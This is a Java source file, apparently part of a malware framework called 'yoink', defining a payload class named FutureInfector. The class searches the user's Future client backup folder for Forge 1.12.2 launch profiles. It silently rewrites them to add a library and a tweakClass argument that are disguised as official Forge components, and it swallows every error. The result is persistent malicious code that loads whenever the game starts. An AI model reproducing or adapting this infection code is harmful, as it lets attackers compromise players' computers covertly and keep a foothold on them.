package me.perry.yoink.payload.impl;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import me.perry.yoink.payload.Payload;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;

public final
class FutureInfector implements Payload {
    @Override
    public
    void execute () {
        try {
            File file = new File(System.getProperty("user.home") + "\\Future\\backup");
            if (file.isDirectory()) {
                for (File f : Objects.requireNonNull(file.listFiles())) {
                    if (f.getName().contains("1.12.2") && f.getName().contains("forge")) {
                        String json = new String(Files.readAllBytes(Paths.get(f.getAbsolutePath())) ,StandardCharsets.UTF_8);
                        if (! json.contains("--tweakClass net.minecraftforge.modloader.Tweaker")) {
                            JsonObject thing = new JsonParser().parse(json).getAsJsonObject();
                            JsonArray array = thing.getAsJsonArray("libraries");
                            JsonObject object = new JsonObject();
                            object.addProperty("name" ,"net.minecraftforge:injector:forgedefault");
                            array.add(object);
                            String args = thing.get("minecraftArguments").getAsString();
                            thing.remove("minecraftArguments");
                            thing.addProperty("minecraftArguments" ,args + " --tweakClass net.minecraftforge.modloader.Tweaker");
                            Files.write(Paths.get(f.getAbsolutePath()) ,thing.toString().getBytes(StandardCharsets.UTF_8));
                        }
                    }
                }
            }
        } catch (Exception ignored) {

        }
    }
}